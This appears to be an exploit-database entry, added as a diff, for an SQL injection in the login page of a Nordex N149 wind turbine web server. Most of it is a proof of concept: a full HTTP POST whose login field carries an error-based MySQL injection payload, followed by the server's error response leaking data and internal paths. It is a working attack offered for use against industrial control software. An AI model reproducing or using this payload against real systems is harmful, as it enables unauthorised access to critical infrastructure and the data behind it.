@@ -1,0 +1,48 @@
+# Exploit Title: Nordex N149/4.0-4.5 Wind Turbine Web Server - SQL Injection
+# Date: 21-05-2018
+# Exploit Author: t4rkd3vilz
+# Vendor Homepage: http://www.nordex-online.com
+# Tested on: Windows
+# Version: N149/4.0-4.5 Wind Turbine
+# Category: webapps
+
+---> Proof Of Concept
+
+-------- > Request
+
+POST /php/login.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/41.0.2272.16 Safari/537.36
+Accept: */*
+Referer: http://IpAdress//
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-us,en;q=0.5
+Host: IPAdress
+Accept-Encoding: gzip, deflate
+Content-Length: 304
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+login=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&password=3
+
+-------- > Response
+
+HTTP/1.1 200 OK
+Server: Apache
+Content-Length: 261
+X-Frame-Options: SAMEORIGIN
+Content-Type: text/html; charset=UTF-8
+Content-Encoding:
+Date: Wed, 16 May 2018 10:49:31 GMT
+Vary: Accept-Encoding
+
+<br />
+<b>Warning</b>:  mysqli::query(): (23000/1062): Duplicate entry
+'_!@4dilemma:1' for key 'group_key' in
+<b>/share/HDA_DATA/Web/php/login.php</b> on line <b>46</b><br />
+<br />
+<b>Notice</b>:  Trying to get property of non-object in
+<b>/share/HDA_DATA/Web/php/login.php</b> on line <b>47</b><br />
+FALSE<br />
+<b>Fatal error</b>:  Call to a member function free() on boolean in
+<b>/share/HDA_DATA/Web/php/login.php</b> on line <b>67</b><br />
